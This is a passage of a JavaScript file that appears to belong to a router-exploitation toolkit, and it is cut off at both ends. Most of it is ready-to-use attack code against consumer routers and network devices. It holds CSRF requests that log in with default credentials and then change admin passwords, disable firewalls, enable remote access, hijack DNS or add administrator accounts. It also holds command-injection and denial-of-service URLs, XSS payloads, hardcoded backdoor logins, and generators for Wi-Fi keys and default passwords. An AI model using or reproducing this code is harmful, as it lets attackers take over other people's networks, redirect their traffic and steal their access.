		document.location="http://"+ip+"/opt/cgi-bin/ggsn/cgi.tcl?page=ggsnconf";
	}
}
function isnser(){
	ip=prompt("Flexi-ISN IP:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/opt/cgi-bin/services.tcl?instance=default";
	}
}
function motfirr(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/frames.asp?userId=admin&password=motorola";
	alert("Continuar...");
	img2.src="http://"+ip+"/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4";
}
function motremr(){
	ip=prompt("IP:");
	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
	alert("Continuar...");
	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
}
function motdnsr(){
	ip=prompt("IP:");
	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
	dns=prompt("DNS:");
	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+dns+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
}
function motpasr(){
	ipp=prompt("IP:");
	ip=prompt("New password:");
	img1.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
	alert("Continuar...");
	img2.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
}
function motfir(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	alert("Continue...");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
}
function motrem(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	alert("Continue...");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
}
function motdns(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	ip=prompt("DNS:");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
}
function motpas(){
	ip=prompt("New password:");
	img1.src="http://192.168.0.1/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
	alert("Continue...");
	img2.src="http://192.168.0.1/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
}

// Motorola SBG6580 Cable Modem & Wireless-N Router Denial of Service
function SBG6580_motorola(ip)
{
	ip = "192.168.0.1" || ip;
    form = '<input type="hidden" name="this_was" value="too_easy"/>\
			</form>';
	post('http://' + ip + '/goform/login', form);
}


function ruggedcom(){
// JC CREW April 23 2012 \n";
// .js by hkm
  mac=prompt("MAC: ");
  mac = mac.replace(/:/g, "");
  mac = mac.replace(/-/g, "");
  mac = mac.replace(/ /g, "");
  var reverse = mac[10]+mac[11]+mac[8]+mac[9]+mac[6]+mac[7]+mac[4]+mac[5]+mac[2]+mac[3]+mac[0]+mac[1]+"0000";
  alert("Password for 'factory' account: "+parseInt(reverse, 16) % 999999929);
}

function acctongen(){
//# Accton Mercury "__super" user proof of concept
//# Disassembling and first PoC - smite@zylon.net.
//# Disassembling and math - psy@datux.nl, gido@datux.nl
//# Ported to Javascript - hkm@hakim.ws
  var counter;
  var pass="";
  q=prompt("MAC:");
  var mac = q.split(':');

  for (counter=0;counter<6;counter++) {
	mac[counter]=parseInt(mac[counter],16);
  }

  function printchar() {
	char = char % 0x4b;	
	if (char <= 9 || (char > 0x10 && char < 0x2a) || char > 0x30) {
		pass=pass+String.fromCharCode(char+0x30);
	} else {
		pass=pass+"!";
	}
  }

  for (counter=0;counter<5;counter++) {
    char = mac[counter];
    char = char + mac[counter+1];
    printchar(char);
  }

  for (counter=0;counter<3;counter++) {
    char = mac[counter];
    char = char + mac[counter+1];
    char = char +  0xF;
    printchar(char);
  }
  alert("PASSWORD: "+pass);
}
function mac2wepkey(){
/* mac2wepkey Huawei HG520 by humberto121@websec.mx - 12/2010 */
/* .js by hkm */
q=prompt("MAC:");
q = q.replace(/:/g,'');

mac = new Array();
for (c=0;c<12;c++) {
   mac[c]=parseInt(q[c], 16);
}

a0=new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
a1=new Array(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15);
a2=new Array(0,13,10,7,5,8,15,2,10,7,0,13,15,2,5,8);
a3=new Array(0,1,3,2,7,6,4,5,15,14,12,13,8,9,11,10);
a4=new Array(0,5,11,14,7,2,12,9,15,10,4,1,8,13,3,6);
a5=new Array(0,4,8,12,0,4,8,12,0,4,8,12,0,4,8,12);
a6=new Array(0,1,3,2,6,7,5,4,12,13,15,14,10,11,9,8);
a7=new Array(0,8,0,8,1,9,1,9,2,10,2,10,3,11,3,11);
a8=new Array(0,5,11,14,6,3,13,8,12,9,7,2,10,15,1,4);
a9=new Array(0,9,2,11,5,12,7,14,10,3,8,1,15,6,13,4);
a10=new Array(0,14,13,3,11,5,6,8,6,8,11,5,13,3,0,1,4);
a11=new Array(0,12,8,4,1,13,9,5,2,14,10,6,3,15,11,7);
a12=new Array(0,4,9,13,2,6,11,15,4,0,13,9,6,2,15,11);
a13=new Array(0,8,1,9,3,11,2,10,6,14,7,15,5,13,4,12);
a14=new Array(0,1,3,2,7,6,4,5,14,15,13,12,9,8,10,11);
a15=new Array(0,1,3,2,6,7,5,4,13,12,14,15,11,10,8,9);
n1=new Array(0,14,10,4,8,6,2,12,0,14,10,4,8,6,2,12);
n2=new Array(0,8,0,8,3,11,3,11,6,14,6,14,5,13,5,13);
n3=new Array(0,0,3,3,2,2,1,1,4,4,7,7,6,6,5,5);
n4=new Array(0,11,12,7,15,4,3,8,14,5,2,9,1,10,13,6);
n5=new Array(0,5,1,4,6,3,7,2,12,9,13,8,10,15,11,14);
n6=new Array(0,14,4,10,11,5,15,1,6,8,2,12,13,3,9,7);
n7=new Array(0,9,0,9,5,12,5,12,10,3,10,3,15,6,15,6);
n8=new Array(0,5,11,14,2,7,9,12,12,9,7,2,14,11,5,0);
n9=new Array(0,0,0,0,4,4,4,4,0,0,0,0,4,4,4,4);
n10=new Array(0,8,1,9,3,11,2,10,5,13,4,12,6,14,7,15);
n11=new Array(0,14,13,3,9,7,4,10,6,8,11,5,15,1,2,12);
n12=new Array(0,13,10,7,4,9,14,3,10,7,0,13,14,3,4,9);
n13=new Array(0,1,3,2,6,7,5,4,15,14,12,13,9,8,10,11);
n14=new Array(0,1,3,2,4,5,7,6,12,13,15,14,8,9,11,10);
n15=new Array(0,6,12,10,9,15,5,3,2,4,14,8,11,13,7,1);
n16=new Array(0,11,6,13,13,6,11,0,11,0,13,6,6,13,0,11);
n17=new Array(0,12,8,4,1,13,9,5,3,15,11,7,2,14,10,6);
n18=new Array(0,12,9,5,2,14,11,7,5,9,12,0,7,11,14,2);
n19=new Array(0,6,13,11,10,12,7,1,5,3,8,14,15,9,2,4);
n20=new Array(0,9,3,10,7,14,4,13,14,7,13,4,9,0,10,3);
n21=new Array(0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15);
n22=new Array(0,1,2,3,5,4,7,6,11,10,9,8,14,15,12,13);
n23=new Array(0,7,15,8,14,9,1,6,12,11,3,4,2,5,13,10);
n24=new Array(0,5,10,15,4,1,14,11,8,13,2,7,12,9,6,3);
n25=new Array(0,11,6,13,13,6,11,0,10,1,12,7,7,12,1,10);
n26=new Array(0,13,10,7,4,9,14,3,8,5,2,15,12,1,6,11);
n27=new Array(0,4,9,13,2,6,11,15,5,1,12,8,7,3,14,10);
n28=new Array(0,14,12,2,8,6,4,10,0,14,12,2,8,6,4,10);
n29=new Array(0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3);
n30=new Array(0,15,14,1,12,3,2,13,8,7,6,9,4,11,10,5);
n31=new Array(0,10,4,14,9,3,13,7,2,8,6,12,11,1,15,5);
n32=new Array(0,10,5,15,11,1,14,4,6,12,3,9,13,7,8,2);
n33=new Array(0,4,9,13,3,7,10,14,7,3,14,10,4,0,13,9);
key=new Array(30,31,32,33,34,35,36,37,38,39,61,62,63,64,65,66);
ssid=new Array(0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f');

s1=(n1[mac[0]])^(a4[mac[1]])^(a6[mac[2]])^(a1[mac[3]])^(a11[mac[4]])^(n20[mac[5]])^(a10[mac[6]])^(a4[mac[7]])^(a8[mac[8]])^(a2[mac[9]])^(a5[mac[10]])^(a9[mac[11]])^5;
s2=(n2[mac[0]])^(n8[mac[1]])^(n15[mac[2]])^(n17[mac[3]])^(a12[mac[4]])^(n21[mac[5]])^(n24[mac[6]])^(a9[mac[7]])^(n27[mac[8]])^(n29[mac[9]])^(a11[mac[10]])^(n32[mac[11]])^10;
s3=(n3[mac[0]])^(n9[mac[1]])^(a5[mac[2]])^(a9[mac[3]])^(n19[mac[4]])^(n22[mac[5]])^(a12[mac[6]])^(n25[mac[7]])^(a11[mac[8]])^(a13[mac[9]])^(n30[mac[10]])^(n33[mac[11]])^11;
s4=(n4[mac[0]])^(n10[mac[1]])^(n16[mac[2]])^(n18[mac[3]])^(a13[mac[4]])^(n23[mac[5]])^(a1[mac[6]])^(n26[mac[7]])^(n28[mac[8]])^(a3[mac[9]])^(a6[mac[10]])^(a0[mac[11]])^10;
ya=(a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13;
yb=(n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4;
yc=(a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7;
yd=(n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14;
ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7;

alert("          WEP = "+key[ya]+key[yb]+key[yc]+key[yd]+key[ye]+"\n          SSID = "+ssid[s1]+ssid[s2]+ssid[s3]+ssid[s4]);
}
String.prototype.toHex = function() {
    return this.replace("com", function(s) {
        return "%"+parseInt(s.charCodeAt()).toString(16);
    });
};

function trend23pwn(){
document.t231.submit();
setTimeout(function() {document.t232.submit();},3000);
setTimeout(function() {document.t233.submit();},6000);
}

function netdos() {
	ip=prompt("IP:");
	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
	if (ip==null || ip==""){}else{
		document.netdos.submit();
	}
}
function netbyp(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/recreate.php";
	alert("Continue...");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/index.php";
	}
}

function netund() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://super:5777364@"+ip;
	}
}
function netundb() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://superman:21241036@"+ip;
	}
}
function netcon() {
	url=prompt("Full URL (without http):");
	dominio=url.substr(0,url.indexOf("/"));
	path=url.substr(url.indexOf("/"), url.lenght);
	if (url==null || url==""){}else{
		document.location="http://"+dominio+path.toHex();
	}
}
function netconb() {
	ip=prompt("IP:");
	port=prompt("Port:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/vgn/jsp/netgear.cfg"+port;
	}
}
function netlog() {
	url=prompt("Blocked URL:");
	code=prompt("Inject code:");
	if (url==null || url==""){}else{
		document.location="http://"+url+"</textarea>"+code;
	}
}

// Cisco WLC 7.2.110.0 - Add Administrator CSRF
function ciscowlc_addadmin()
{
	ip = prompt("IP: ")
    newuser = prompt("New User: ");
    passwd = prompt("New Password: ");
    form = '<input type="hidden" name="access_control" value="1"/>\
			<input type="hidden" name="username" value="' + newuser + '"/>\
			<input type="hidden" name="userpwd" value="' + passwd +  '"/>\
			<input type="hidden" name="pwdconfirm" value="' + passwd +  '"/>\
			<input type="hidden" name="access_mode" value="readwrite"/>\
			<input type="hidden" name="buttonClicked" value="4"/>\
			</form>';
	post('https://' + ip + '/screens/aaa/mgmtuser_create.html', form);

}

function ciscowlc_dos()
{
	ip = prompt("IP: ")
	url = ip + "/screens/base/web_auth_custom.html?&webauth_type=internal&buttonClicked=4";
    document.location(url);

}

// Zyxel P-660HW-T1 v3 Wireless Router - Change Wifi (WPA2/PSK) password & SSID
function zyxel_660hwt1_v3_changessidpass(ip)
{
    ip = ip || "192.168.1.1";
    pwd = prompt("New WLAN Password: ");
    ssid = prompt("New SSID: ");
    form = '<input type="hidden" name="EnableWLAN" value="on">\
			<input type="hidden" name="Channel_ID" value="00000005">\
			<input type="hidden" name="ESSID" value="' + ssid + ' ">\
			<input type="hidden" name="Security_Sel" value="00000002">\
			<input type="hidden" name="SecurityFlag" value="0">\
			<input type="hidden" name="WLANCfgPSK" value="' + pwd + '">\
			<input type="hidden" name="WLANCfgWPATimer" value="1800">\
			<input type="hidden" name="QoS_Sel" value="00000000">\
			<input type="hidden" name="sysSubmit" value="Uygula">';
			
	post('http://' + ip + '/Forms/WLAN_General_1', form);

}


function sagemtelnet(){

	function mash(a,b){
	        first=Math.min(a,b)
	        second=Math.max(a,b)
	        if( parseInt(second ,16 ) < 10){
	                if(parseInt(first,16)+parseInt(second,16)<=9){
				firststr=""+first
	                        return String.fromCharCode(firststr.charCodeAt(0)+parseInt(second,16))
	                } else
	                        return toString(16)(first.charCodeAt(0)+parseInt(second,16))
		} else
	                return String.fromCharCode(second.charCodeAt(0)+parseInt(first,16))
	}

	mac=prompt("MAC: ");
	mac = mac.replace(/:/g, "");
	mac = mac.replace(/-/g, "");
	mac = mac.replace(/ /g, "");
	var password = new Array();
        password[0]= mash(mac[5],mac[11])
        password[1]= mash(mac[0],mac[2])
        password[2]= mash(mac[10],mac[11])
        password[3]= mash(mac[0],mac[9])
        password[4]= mash(mac[10],mac[6])
        password[5]= mash(mac[3],mac[9])
        password[6]= mash(mac[1],mac[6])
        password[7]= mash(mac[3],mac[4])
        alert("Telnet root password: "+password.join(""))
}

function sagemcable(){
	ssid=prompt("SSID: ");
	ssid=ssid.substring(3);
	var password = new Array();
        password[0]= "2ce412ea"+ssid;
        password[1]= "2ce412eb"+ssid;
        password[2]= "2ce412ec"+ssid;
        password[3]= "2ce412ed"+ssid;

        alert("Possible wireless keys: "+"\n"+password[0]+"\n"+password[1]+"\n"+password[2]+"\n"+password[3])
}


function easyboxwpa(){
	mac=prompt("MAC: ");
	mac = mac.replace(/:/g, "");
	mac = mac.replace(/-/g, "");
	mac = mac.replace(/ /g, "");

	if (mac.length == 12){
		C1 = ""+ parseInt(mac.substring(8), 16);

		while (C1.length < 5) C1 = 0+C1;

		S6 = parseInt(C1.charAt(0),16);
		S7 = parseInt(C1.charAt(1),16);
		S8 = parseInt(C1.charAt(2),16);
		S9 = parseInt(C1.charAt(3),16);
		S10 = parseInt(C1.charAt(4),16);
		M7 = parseInt(mac.charAt(6),16);
		M8 = parseInt(mac.charAt(7),16);
		M9 = parseInt(mac.charAt(8),16);
		M10 = parseInt(mac.charAt(9),16);
		M11 = parseInt(mac.charAt(10),16);
		M12 = parseInt(mac.charAt(11),16);

		K1 = (S7+S8+M11+M12) & (0x0F);
		K2 = (M9+M10+S9+S10) & (0x0F);

		X1 = K1^S10;
		X2 = K1^S9;
		X3 = K1^S8;
		Y1 = K2^M10;
		Y2 = K2^M11;
		Y3 = K2^M12;
		Z1 = M11^S10;
		Z2 = M12^S9;
		Z3 = K1^K2;

		ssid =  'EasyBox-' + M7.toString(16) + M8.toString(16) + M9.toString(16) + M10.toString(16) + S6.toString(16) + S10.toString(16);
		wpaKey = X1.toString(16)+Y1.toString(16)+Z1.toString(16)+X2.toString(16)+Y2.toString(16)+Z2.toString(16)+X3.toString(16)+Y3.toString(16)+Z3.toString(16);

		alert("SSID: "+ ssid + "\nWPA-KEY: "+ wpaKey.toUpperCase());
			
	} else {
		alert("Error: MAC-Address must have 12 digits!");
	}
}

/* pdp exploit */
function readConfig() {
	login();
	setTimeout(function() {
		xss('"><iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);">');
	}, 2000);
}
function xss(payload) { /* grax por el fix Alvaro Soto*/
	ifrm = document.getElementById('iframe');
	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/web.....9;'+payload;
}
function login() {
	ip = ip | "192.168.1.1"
	var f = document.createElement('form');
	f.action = 'http://' + ip  + 'cgi-bin/webcm';
	f.innerHTML = '<input type="hidden" name="getpage" value="../html/home.htm"><input type="hidden" name="errorpage" value="../html/index.html">';
	f.innerHTML += '<input type="hidden" name="login:command/username" value="admin"><input type="hidden" name="login:command/password" value="admin">';
	f.innerHTML += '<input type="hidden" name="var:errormsg" value="Error">';
	f.target = 'iframe';
	f.method = 'post';
	document.body.appendChild(f);
	f.submit();
}
function post(url, fields) {
	var p = document.createElement('form');
	p.action = url;
	p.innerHTML = fields;
//	p.target = 'iframe';
	p.method = 'post';
	document.body.appendChild(p);
	p.submit();
}
function posts(url, fields) {
	var p = document.createElement('form');
	p.action = url;
	p.innerHTML = fields;
	p.target = 'iframe';
	p.method = 'post';
	document.body.appendChild(p);
	p.submit();
}
function changeDNS(server, ip) {
	ip = ip | "192.168.1.1";
	login();
	setTimeout(function() {
		var fields = '<input type="hidden" name="getpage" value="../html/setup/dns.htm">';
		fields += '<input type="hidden" name="resolver:settings/nameserver1" value="'+server+'">';
		fields += '<input type="hidden" name="resolver:settings/nameserver2" value="'+server+'">';
		fields += '<input type="hidden" name="dproxy:settings/state" value="2">';
		posts('http://' + ip + '/cgi-bin/webcm',fields);
	}, 2000);
	setTimeout(function() {
		posts('http://' + ip + '/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
	},5000);
}
/* end pdp */
function dlidns() {
	dns=prompt("DNS server:");
	changeDNS(dns);
}

function ddwrtexec() {
	cmd=prompt("Command:");
	if (cmd==null || cmd==""){}else{
		document.location="http://192.168.1.1/cgi-bin/;"+cmd;
	}
}

function dns320() {
	cmd=prompt("Command:");
	if (cmd==null || cmd==""){}else{
		document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
	}
}

function dns320r() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
	}
}


function ddwrtexecr() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cgi-bin/;"+cmd;
	}
}

function huados() {
	ip=prompt("IP:");
	if (ip==null || ip==""){}else{
		document.location="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@"+ip;
}
}
function asmrce() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cgi-bin/script?system%20"+cmd;
	}
}
function asmfile() {
	ip=prompt("IP:");
	cmd=prompt("File:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/cgi-bin/webcm?getpage="+cmd;
	}
}

function comtrendpass() {
	pass=prompt("New password:");
	document.comtrendpass.sptPassword.value=pass;
	document.comtrendpass.usrPassword.value=pass;
	document.comtrendpass.sysPassword.value=pass;
	document.comtrendpass.action="http://192.168.1.1";
	if (pass==null || pass==""){}else{
		document.comtrendpass.submit();
	}
}

function comtrendpassr() {
	ip=prompt("IP:");
	pass=prompt("New password:");
	document.comtrendpass.sptPassword.value=pass;
	document.comtrendpass.usrPassword.value=pass;
	document.comtrendpass.sysPassword.value=pass;
	document.comtrendpass.action="http://"+ip;
	if (ip==null || ip==""){}else{
		document.comtrendpass.submit();
	}
}
function ea2700passr() {
	ip=prompt("IP:");
	xss=prompt("New password:");
	document.ea2700pass.http_passwd.value=xss;
	document.ea2700pass.http_passwdConfirm.value=xss;
	document.ea2700pass.action="http://"+ip;
	if (ip==null || ip==""){}else{
		document.ea2700pass.submit();
	}
}

function trendCSRF() {
	ip=prompt("IP:");
	document.trendCSRF.action="http://"+ip+"/setSysAdm.cgi";
	if (ip==null || ip==""){}else{
		document.trendCSRF.submit();
	}
}
function trendCSRF2() {
	ip=prompt("IP:");
	document.trendCSRF2.action="http://"+ip+"/uapply.cgi";
	if (ip==null || ip==""){}else{
		document.trendCSRF2.submit();
	}
}


function ea2700xssr() {
	ip=prompt("IP:");
	xss=prompt("XSS:");
	document.ea2700xss.submit_button.value=xss;
	document.ea2700xss.action="http://"+ip;
	if (ip==null || ip==""){}else{
		document.ea2700xss.submit();
	}
}

function CSRFxssPWN() {
	ip=prompt("IP:");
	xss=prompt("XSS:");
	document.CSRFxssPWN.submit_button.value=xss;
	document.CSRFxssPWN.action="http://"+ip;
	if (ip==null || ip==""){}else{
		document.CSRFxssPWN.submit();
	}
}

function ea2700pathr() {
	ip=prompt("IP:");
	xss=prompt("FILE:");
	document.ea2700path.next_page.value=xss;
	document.ea2700path.action="http://"+ip;
	if (ip==null || ip==""){}else{
		document.ea2700path.submit();
	}
}


function N56Ur() {
	ip=prompt("IP:");
	document.N56U.action="http://"+ip+"/start_apply.htm";
	if (ip==null || ip==""){}else{
		document.N56U.submit();
	}
}

function ncomtrendpass() {
	pass=prompt("New password:");
	if (pass==null || pass==""){}else{
		document.location="http://192.168.1.1/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
	}
}

function ncomtrendpassr() {
	ip=prompt("IP:");
	pass=prompt("New password:");
	if (ip==null || ip==""){}else{
		document.location="http://"+ip+"/password.cgi?sysPassword="+pass+"&sptPassword="+pass;
	}
}

function comtrendip() {
	ip=prompt("Local IP to put in DMZ:");
	if (ip==null || ip==""){}else{
		document.location="http://192.168.1.1/scdmz.cmd?address="+ip;
	}
}

function comtrendipr() {
	ipp=prompt("Router IP:");
	ip=prompt("Local IP to put in DMZ:");
	if (ipp==null || ipp==""){}else{
		document.location="http://"+ipp+"/scdmz.cmd?address="+ip;
	}
}

function xavi() {
	nombre=prompt("Name of the rule:");
	ip=prompt("Allow IP:");
	port=prompt("Allow Port:");
	if (ip==null || ip==""){}else{
		document.location="http://192.168.1.1/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
	}
}

function xavir() {
	ipp=prompt("Target IP:");
	nombre=prompt("Name of the rule:");
	ip=prompt("Allow IP:");
	port=prompt("Allow Port:");
	if (ipp==null || ipp==""){}else{
		document.location="http://"+ipp+"/webconfig/portforwarding/portforwarding1.html/natAdd?apptype=userdefined&rulename="+nombre+"&waninterface=ppp-0&inthostip="+ip+"&protocol1=proto_6&extportstart1="+port+"&extportend1="+port+"&intportstart1="+port+"&intportend1="+port+"&protocol2=NONE&protocol3=NONE&Applybutton=Apply";
	}
}

// Netgear Prosafe - Configuration Disclosure
function prosafe_configdisclosure(ip)
{
    ip = ip || "192.168.1.1";
    document.location="http://"+ip+"/filesystem/startup-config";
}

function wxv10w300_changeadmin()
{
	ip = ip || "192.168.1.1";
	pwd = prompt("New Password: ")
	form = '<input type="hidden" name="uiViewTools_Password" value="' + pwd +'" />\
      <input type="hidden" name="uiViewTools_PasswordConfirm" value="' + pwd +'" />';
      post('http://' + ip + 'http://192.168.1.1/Forms/tools_admin_1', form);
}

/*
 * Arris TM602A password of the day generator
 * 
 * Author: Raul Pedro Fernandes Santos
 * Project homepage: http://www.borfast.com/projects/arrispwgen
 * 
 * Copyright (c) 2010, Raul Pedro Fernandes Santos
 * All rights reserved.
*/

function GenArrisPasswords(startdate, enddate) {
  var password_count;
  var date1, date2;
  var one_day_in_milliseconds = 24 * 60 * 60 * 1000; 
  if (startdate !== undefined && enddate !== undefined) {
    password_count = Math.ceil((enddate - startdate) / one_day_in_milliseconds);
  } else {
    password_count = 1;
    if (startdate === undefined) {
      startdate = (new Date()).getTime();
    }
  }

  if ((password_count < 1) | (password_count > 365)) {
    alert('Since we can only generate passwords for a full year at a time, the number of passwords must be between 1 and 365.');
  } else {
    var seed = 'MPSJKMDHAI';
    var seedeight = seed.substr(0, 8);
    var seedten = seed;

    var table1 = [
      [15, 15, 24, 20, 24],
      [13, 14, 27, 32, 10],
      [29, 14, 32, 29, 24],
      [23, 32, 24, 29, 29],
      [14, 29, 10, 21, 29],
      [34, 27, 16, 23, 30],
      [14, 22, 24, 17, 13]
    ];

    var table2 = [
      [0, 1, 2, 9, 3, 4, 5, 6, 7, 8],
      [1, 4, 3, 9, 0, 7, 8, 2, 5, 6],
      [7, 2, 8, 9, 4, 1, 6, 0, 3, 5],
      [6, 3, 5, 9, 1, 8, 2, 7, 4, 0],
      [4, 7, 0, 9, 5, 2, 3, 1, 8, 6],
      [5, 6, 1, 9, 8, 0, 4, 3, 2, 7]
    ];

    var alphanum = [
      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D',
      'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R',
      'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
    ];

    var list1 = [];
    var list2 = [];
    var list3 = [];
    var list4 = [];
    var list5 = [];    
    var year;
    var month;
    var day_of_month;
    var day_of_week;
    var iter, i;
    for (iter = 0; iter < password_count; iter++) {
      date = new Date(startdate + (iter * one_day_in_milliseconds));
      year = parseInt(date.getFullYear().toString(10).substr(2, 2), 10);
      month = date.getMonth() + 1;
      day_of_month = date.getDate();
      day_of_week = date.getDay() - 1;
      if (day_of_week < 0) {
      	day_of_week = 6;
      }
      for (i = 0; i <= 4; i++) {
        list1[i] = table1[day_of_week][i];
      }
      list1[5] = day_of_month;
      if (((year + month) - day_of_month) < 0) {
        list1[6] = (((year + month) - day_of_month) + 36) % 36;
      } else {
        list1[6] = ((year + month) - day_of_month) % 36;
      }
      list1[7] = (((3 + ((year + month) % 12)) * day_of_month) % 37) % 36;
      for (i = 0; i <= 7; i++) {
        list2[i] = (seedeight.substr(i, 1).charCodeAt(0)) % 36;
      }
      for (i = 0; i <= 7; i++) {
        list3[i] = (((list1[i] + list2[i])) % 36);
      }
      list3[8] = (list3[0] + list3[1] + list3[2] + list3[3] + list3[4] +
          list3[5] + list3[6] + list3[7]) % 36;
      var num8 = (list3[8] % 6);
      list3[9] = Math.round(Math.pow(num8, 2));
      for (i = 0; i <= 9; i++) {
        list4[i] = list3[table2[num8][i]];
      }
      for (i = 0; i <= 9; i++) {
        list5[i] = ((seedten.substr(i, 1).charCodeAt(0)) + list4[i]) % 36;
      }
      var password_of_the_day = [];
      var len = list5.length;
